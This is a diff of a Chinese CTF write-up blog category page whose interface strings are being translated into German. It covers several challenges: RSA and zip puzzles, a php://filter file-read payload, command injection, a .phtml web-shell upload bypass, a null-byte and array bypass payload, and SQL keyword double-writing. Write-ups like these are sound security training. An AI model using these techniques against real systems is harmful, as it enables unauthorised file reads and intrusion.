@@ -7,7 +7,7 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>Category: CTF - Da4er&#39;s Blogs</title>
+<title>Kategorie: CTF - Da4er&#39;s Blogs</title>
 
 
     <meta name="description" content="学而专，专而精。">
@@ -118,7 +118,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Search" href="javascript:;">
+                <a class="navbar-item search" title="Suche" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -134,7 +134,7 @@
     <div class="card-content">
         <nav class="breadcrumb" aria-label="breadcrumbs">
         <ul>
-            <li><a href="/categories">Categories</a></li>
+            <li><a href="/categories">Kategorien</a></li>
             
             <li class="is-active"><a href="#" aria-current="page">CTF</a></li>
         </ul>
@@ -159,7 +159,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes read (About 317 words)
+                    2 minutes lesen (Über 317 Worte)
                 </span>
                 
                 
@@ -172,21 +172,8 @@
             
         </h1>
         <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<p><strong>首先拿到题目，有一个虚假的压缩包和真实的压缩包</strong><br><strong>很明显虚假的压缩包是伪加密</strong></p>
-<img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/1.png" class title="Da4er">
-<p><strong>打开压缩包后发现是解rsa</strong></p>
-<img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/2.png" class title="Da4er">
-<p><strong>有n，e，c是个简单的rsa，直接脚本一把梭</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">c &#x3D; 26</span><br><span class="line">n &#x3D; 33</span><br><span class="line">e &#x3D; 0x3</span><br><span class="line">q &#x3D; 11</span><br><span class="line">p &#x3D; 13</span><br><span class="line"></span><br><span class="line">d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))</span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">print &quot;m的值为:&quot;</span><br><span class="line">print m</span><br><span class="line">#print long_to_bytes(m)</span><br></pre></td></tr></table></figure>
-<p><strong>得到m为5，可是提示密码不对，这里有个脑洞要加上key.txt前面的”答案是”才是正确的密码，所以真实的压缩包密码为:答案是5。</strong><br><strong>解压后通过修改图片高度</strong></p>
-<img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/3.png" class title="Da4er">
-<p><strong>发现一个将另一个文件的所以和5进行异或</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;flag&quot;,&quot;r&quot;) as fp:</span><br><span class="line">    r&#x3D;fp.read()</span><br><span class="line">    with open(&quot;xor.txt&quot;,&quot;w&quot;) as fp1:</span><br><span class="line">        for i in r:</span><br><span class="line">            tmp&#x3D;int(i,16)^5</span><br><span class="line">            fp1.write(hex(tmp)[2:])</span><br></pre></td></tr></table></figure>
-<p><strong>得到的是以”504b0304”开头的，将他放到winhex里进行转换acii</strong></p>
-<img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/4.png" class title="Da4er">
-<p><strong>看到是word类型的压缩包，这里的一个知识点：word本身就是个压缩包。所以把zip后缀改成doc，再将字体颜色换成深色，得到flag。</strong></p>
-<img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/5.png" class title="Da4er">
+            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>首先拿到题目，有一个虚假的压缩包和真实的压缩包</strong><br><strong>很明显虚假的压缩包是伪加密</strong><br><img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/1.png" class title="Da4er"><br><strong>打开压缩包后发现是解rsa</strong><br><img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/2.png" class title="Da4er"><br><strong>有n，e，c是个简单的rsa，直接脚本一把梭</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">c &#x3D; 26</span><br><span class="line">n &#x3D; 33</span><br><span class="line">e &#x3D; 0x3</span><br><span class="line">q &#x3D; 11</span><br><span class="line">p &#x3D; 13</span><br><span class="line"></span><br><span class="line">d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))</span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">print &quot;m的值为:&quot;</span><br><span class="line">print m</span><br><span class="line">#print long_to_bytes(m)</span><br></pre></td></tr></table></figure><br><strong>得到m为5，可是提示密码不对，这里有个脑洞要加上key.txt前面的”答案是”才是正确的密码，所以真实的压缩包密码为:答案是5。</strong><br><strong>解压后通过修改图片高度</strong><br><img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/3.png" class title="Da4er"><br><strong>发现一个将另一个文件的所以和5进行异或</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;flag&quot;,&quot;r&quot;) as fp:</span><br><span class="line">    r&#x3D;fp.read()</span><br><span class="line">    with open(&quot;xor.txt&quot;,&quot;w&quot;) as fp1:</span><br><span class="line">        for i in r:</span><br><span class="line">            tmp&#x3D;int(i,16)^5</span><br><span class="line">            fp1.write(hex(tmp)[2:])</span><br></pre></td></tr></table></figure><br><strong>得到的是以”504b0304”开头的，将他放到winhex里进行转换acii</strong><br><img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/4.png" class title="Da4er"><br><strong>看到是word类型的压缩包，这里的一个知识点：word本身就是个压缩包。所以把zip后缀改成doc，再将字体颜色换成深色，得到flag。</strong><br><img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/5.png" class title="Da4er"></p>
+
         </div>
         
         
@@ -220,7 +207,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a minute read (About 135 words)
+                    a minute lesen (Über 135 Worte)
                 </span>
                 
                 
@@ -233,15 +220,7 @@
             
         </h1>
         <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<p><strong>这道题用到了压缩包：暴力破解，伪加密，掩码攻击等知识点</strong><br><strong>第一步先用暴力破解把222.zip密码找出来</strong></p>
-<img src="/2-11-GUET-CTF2019-zips/1.png" class title="Da4er">
-<p><strong>第二步看到一个111.zip，里面有个flag.zip和setup.sh，先把flag.zip提出来，再用伪加密把111.zip打开</strong></p>
-<img src="/2-11-GUET-CTF2019-zips/2.png" class title="Da4er">
-<p><strong>第三步setup.sh的python代码运行查看，发现flag.zip密码规律:15????????.??</strong></p>
-<img src="/2-11-GUET-CTF2019-zips/3.png" class title="Da4er">
-<p><strong>最后使用掩码攻击的方式得到flag</strong></p>
-<img src="/2-11-GUET-CTF2019-zips/4.png" class title="Da4er">
+            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>这道题用到了压缩包：暴力破解，伪加密，掩码攻击等知识点</strong><br><strong>第一步先用暴力破解把222.zip密码找出来</strong><br><img src="/2-11-GUET-CTF2019-zips/1.png" class title="Da4er"><br><strong>第二步看到一个111.zip，里面有个flag.zip和setup.sh，先把flag.zip提出来，再用伪加密把111.zip打开</strong><br><img src="/2-11-GUET-CTF2019-zips/2.png" class title="Da4er"><br><strong>第三步setup.sh的python代码运行查看，发现flag.zip密码规律:15????????.??</strong><br><img src="/2-11-GUET-CTF2019-zips/3.png" class title="Da4er"><br><strong>最后使用掩码攻击的方式得到flag</strong><br><img src="/2-11-GUET-CTF2019-zips/4.png" class title="Da4er"></p>
 
         </div>
         
@@ -276,7 +255,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    3 minutes read (About 421 words)
+                    3 minutes lesen (Über 421 Worte)
                 </span>
                 
                 
@@ -289,39 +268,14 @@
             
         </h1>
         <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<h3 id="Inlcude"><a href="#Inlcude" class="headerlink" title="Inlcude"></a>Inlcude</h3><p><strong>点进去tips发现是file=flag.php，想到php伪协议读取</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/1.png" class title="Da4er">
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/2.png" class title="Da4er">
-<p><strong>base64解码后得到flag</strong></p>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/3.png" class title="Da4er">
-
+            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
+<h3 id="Inlcude"><a href="#Inlcude" class="headerlink" title="Inlcude"></a>Inlcude</h3><p><strong>点进去tips发现是file=flag.php，想到php伪协议读取</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/1.png" class title="Da4er"><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/2.png" class title="Da4er"><br><strong>base64解码后得到flag</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/3.png" class title="Da4er"></p>
 <hr>
-<h3 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h3><p><strong>根据题目提示找到备份文件：index.php.bak</strong><br><strong>开始审计这段代码</strong></p>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/4.png" class title="Da4er">
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/5.png" class title="Da4er">
-<p>发现用了is_numeric函数，但是php版本是7.3，无法使用数组绕过<br>接着看发现是弱类型比较(==)，并且 <strong>$str在==后面</strong> ，所以整个逻辑就很清楚了。<br>首先传个参数key，检测key是否为数字，然后用intval函数取得key的整数部分，在把str变量和key比较，<strong>这里逻辑要清楚是str变量和key比较，所以str在比较前转换成数字’123’。</strong><br>所以直接让key=123即可</p>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/6.png" class title="Da4er">
-
+<h3 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h3><p><strong>根据题目提示找到备份文件：index.php.bak</strong><br><strong>开始审计这段代码</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/4.png" class title="Da4er"><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/5.png" class title="Da4er"><br>发现用了is_numeric函数，但是php版本是7.3，无法使用数组绕过<br>接着看发现是弱类型比较(==)，并且 <strong>$str在==后面</strong> ，所以整个逻辑就很清楚了。<br>首先传个参数key，检测key是否为数字，然后用intval函数取得key的整数部分，在把str变量和key比较，<strong>这里逻辑要清楚是str变量和key比较，所以str在比较前转换成数字’123’。</strong><br>所以直接让key=123即可<br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/6.png" class title="Da4er"></p>
 <hr>
-<h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h3><p><strong>打开网页发现是命令执行（SSRF）</strong></p>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/7.png" class title="Da4er">
-<p><strong>并且没有过滤||等关键字</strong></p>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/8.png" class title="Da4er">
-<p><strong>直接查看根目录下面的文件</strong></p>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/9.png" class title="Da4er">
-<p><strong>看到有个flag文件，cat出来</strong></p>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/10.png" class title="Da4er">
-
+<h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h3><p><strong>打开网页发现是命令执行（SSRF）</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/7.png" class title="Da4er"><br><strong>并且没有过滤||等关键字</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/8.png" class title="Da4er"><br><strong>直接查看根目录下面的文件</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/9.png" class title="Da4er"><br><strong>看到有个flag文件，cat出来</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/10.png" class title="Da4er"></p>
 <hr>
-<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p><strong>首先上传一个txt发现当点击submit时会返回chekfile页面</strong></p>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/11.png" class title="Da4er">
-<p><strong>将这个js代码删除，再上传。通过试了很多上传方法，发现用大小写绕过，点号绕过，空格绕过但是都不解析。上传.htaccess文件被过滤。但是phtml文件没有被过滤，上传这个文件</strong></p>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/12.png" class title="Da4er">
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/13.png" class title="Da4er">
-<p>成功解析<br>连接小马，得到flag。</p>
-<img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/14.png" class title="Da4er">
+<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p><strong>首先上传一个txt发现当点击submit时会返回chekfile页面</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/11.png" class title="Da4er"><br><strong>将这个js代码删除，再上传。通过试了很多上传方法，发现用大小写绕过，点号绕过，空格绕过但是都不解析。上传.htaccess文件被过滤。但是phtml文件没有被过滤，上传这个文件</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/12.png" class title="Da4er"><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/13.png" class title="Da4er"><br>成功解析<br>连接小马，得到flag。<br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/14.png" class title="Da4er"></p>
 
         </div>
         
@@ -356,7 +310,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a few seconds read (About 77 words)
+                    a few seconds lesen (Über 77 Worte)
                 </span>
                 
                 
@@ -369,14 +323,7 @@
             
         </h1>
         <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<p><strong>用winhex打开，发现有个flag.exe</strong></p>
-<img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/1.png" class title="Da4er">
-<p><strong>foremost分离一下，找到flag.exe  strings命令查看一下</strong></p>
-<img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/2.png" class title="Da4er">
-<img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/3.png" class title="Da4er">
-<p><strong>有个Flag{，在windows下打开这个exe，发现会创建一个flag.txt，就可以得到flag</strong></p>
-<img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/4.png" class title="Da4er">
+            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>用winhex打开，发现有个flag.exe</strong><br><img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/1.png" class title="Da4er"><br><strong>foremost分离一下，找到flag.exe  strings命令查看一下</strong><br><img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/2.png" class title="Da4er"><br><img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/3.png" class title="Da4er"><br><strong>有个Flag{，在windows下打开这个exe，发现会创建一个flag.txt，就可以得到flag</strong><br><img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/4.png" class title="Da4er"></p>
 
         </div>
         
@@ -411,7 +358,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a minute read (About 127 words)
+                    a minute lesen (Über 127 Worte)
                 </span>
                 
                 
@@ -424,18 +371,7 @@
             
         </h1>
         <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<p><strong>用winhex打开，发现题目提示的0x220x44</strong></p>
-<img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/1.png" class title="Da4er">
-<p><strong>将”换成0，D换成1，转换成二进制后在转换成文本，出现乱码</strong></p>
-<img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/2.png" class title="Da4er">
-<img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/3.png" class title="Da4er">
-<p><strong>将转换成的二进制翻转后再解码</strong></p>
-<img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/4.png" class title="Da4er">
-<img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/5.png" class title="Da4er">
-<p><strong>得到一串字母和数字，提交发现flag不对，这时我们需要再将这串字符串再翻转一次。</strong></p>
-<img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/6.png" class title="Da4er">
-<p><strong>最后得到flag。</strong></p>
+            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>用winhex打开，发现题目提示的0x220x44</strong><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/1.png" class title="Da4er"><br><strong>将”换成0，D换成1，转换成二进制后在转换成文本，出现乱码</strong><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/2.png" class title="Da4er"><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/3.png" class title="Da4er"><br><strong>将转换成的二进制翻转后再解码</strong><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/4.png" class title="Da4er"><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/5.png" class title="Da4er"><br><strong>得到一串字母和数字，提交发现flag不对，这时我们需要再将这串字符串再翻转一次。</strong><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/6.png" class title="Da4er"><br><strong>最后得到flag。</strong></p>
 
         </div>
         
@@ -470,7 +406,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a minute read (About 150 words)
+                    a minute lesen (Über 150 Worte)
                 </span>
                 
                 
@@ -483,16 +419,7 @@
             
         </h1>
         <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<p><strong>这道题收获就是得到一个des解密脚本。</strong><br><strong>首先winhex打开发现是png文件</strong></p>
-<img src="/2-9-QCTF2018-picture/1.png" class title="Da4er">
-<p><strong>经过了许多png隐写的尝试发现是lsb隐写</strong><br><strong>密码为图片中文字的首字母</strong></p>
-<img src="/2-9-QCTF2018-picture/2.png" class title="Da4er">
-<p><strong>得到一个python脚本，发现是des加密脚本</strong><br><strong>看了别的师傅写的wp发现了一个好用的des解密脚本,然后用这个脚本就可以得到flag</strong></p>
-<img src="/2-9-QCTF2018-picture/3.png" class title="Da4er">
-<p>解密脚本：<a href="https://github.com/liupengs/DES_Python/blob/master/des.py">链接</a></p>
-<img src="/2-9-QCTF2018-picture/4.png" class title="Da4er">
-
+            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>这道题收获就是得到一个des解密脚本。</strong><br><strong>首先winhex打开发现是png文件</strong><br><img src="/2-9-QCTF2018-picture/1.png" class title="Da4er"><br><strong>经过了许多png隐写的尝试发现是lsb隐写</strong><br><strong>密码为图片中文字的首字母</strong><br><img src="/2-9-QCTF2018-picture/2.png" class title="Da4er"><br><strong>得到一个python脚本，发现是des加密脚本</strong><br><strong>看了别的师傅写的wp发现了一个好用的des解密脚本,然后用这个脚本就可以得到flag</strong><br><img src="/2-9-QCTF2018-picture/3.png" class title="Da4er"><br>解密脚本：<a href="https://github.com/liupengs/DES_Python/blob/master/des.py">链接</a><br><img src="/2-9-QCTF2018-picture/4.png" class title="Da4er"></p>
 <img src="/2-9-QCTF2018-picture/5.png" class title="Da4er">
 
         </div>
@@ -528,7 +455,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes read (About 226 words)
+                    2 minutes lesen (Über 226 Worte)
                 </span>
                 
                 
@@ -541,14 +468,7 @@
             
         </h1>
         <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<p><strong>这道题脑洞比较大，也出现很多新的知识点，以此记录一下。</strong><br>首先题目给了一个wav文件，是《my little pony theme song》。根据题目提示要消除BGM，得到人声。<br>消除BGM的方法：</p>
-<img src="/2-9-QCTF2018-Noise/1.png" class title="Da4er">
-<p>所以我们要找到原曲，将原曲的相位翻转180度即可。这里使用的软件为：Adobe Audition</p>
-<img src="/2-9-QCTF2018-Noise/2.png" class title="Da4er">
-<p>得到处理后的文件.wav<br>然后听一下是电信号，这里用到了慢扫描电视的知识点。<br>参考文章：<a href="https://zhuanlan.zhihu.com/p/105460358">https://zhuanlan.zhihu.com/p/105460358</a><br>这里使用的是mmsstv工具，首先要先将得到wav录制成mmsstv识别的mmv文件，工具自带了录声音功能。<br>最后得到flag：</p>
-<img src="/2-9-QCTF2018-Noise/3.png" class title="Da4er">
-
+            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>这道题脑洞比较大，也出现很多新的知识点，以此记录一下。</strong><br>首先题目给了一个wav文件，是《my little pony theme song》。根据题目提示要消除BGM，得到人声。<br>消除BGM的方法：<br><img src="/2-9-QCTF2018-Noise/1.png" class title="Da4er"><br>所以我们要找到原曲，将原曲的相位翻转180度即可。这里使用的软件为：Adobe Audition<br><img src="/2-9-QCTF2018-Noise/2.png" class title="Da4er"><br>得到处理后的文件.wav<br>然后听一下是电信号，这里用到了慢扫描电视的知识点。<br>参考文章：<a href="https://zhuanlan.zhihu.com/p/105460358">https://zhuanlan.zhihu.com/p/105460358</a><br>这里使用的是mmsstv工具，首先要先将得到wav录制成mmsstv识别的mmv文件，工具自带了录声音功能。<br>最后得到flag：<br><img src="/2-9-QCTF2018-Noise/3.png" class title="Da4er"></p>
 <p>用到的知识点：<br>怎么去掉BGM<br>慢扫描电视</p>
 
         </div>
@@ -584,7 +504,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes read (About 232 words)
+                    2 minutes lesen (Über 232 Worte)
                 </span>
                 
                 
@@ -597,25 +517,10 @@
             
         </h1>
         <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><strong>查看网页源代码找到一处php代码：</strong></p>
-<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/1.png" class title="Da4er">
-<p><strong>抓包查看：将user=1</strong></p>
-<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/2.png" class title="Da4er">
-<p><strong>然后绕过is_numeric函数，通过%00截断绕过。</strong></p>
-<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/3.png" class title="Da4er">
-<p><strong>然后需要money字段，用到数组绕过。</strong></p>
-<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/4.png" class title="Da4er">
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;404%00&amp;money[]&#x3D;100000000</span><br></pre></td></tr></table></figure>
-
+            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
+<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><strong>查看网页源代码找到一处php代码：</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/1.png" class title="Da4er"><br><strong>抓包查看：将user=1</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/2.png" class title="Da4er"><br><strong>然后绕过is_numeric函数，通过%00截断绕过。</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/3.png" class title="Da4er"><br><strong>然后需要money字段，用到数组绕过。</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/4.png" class title="Da4er"><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;404%00&amp;money[]&#x3D;100000000</span><br></pre></td></tr></table></figure></p>
 <hr>
-<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p><strong>通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过，有可显字段，使用普通的sql注入语句加上双写关键字即可完成注入。</strong></p>
-<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/5.png" class title="Da4er">
-<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/6.png" class title="Da4er">
-<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/7.png" class title="Da4er">
-<p>使用的payload：</p>
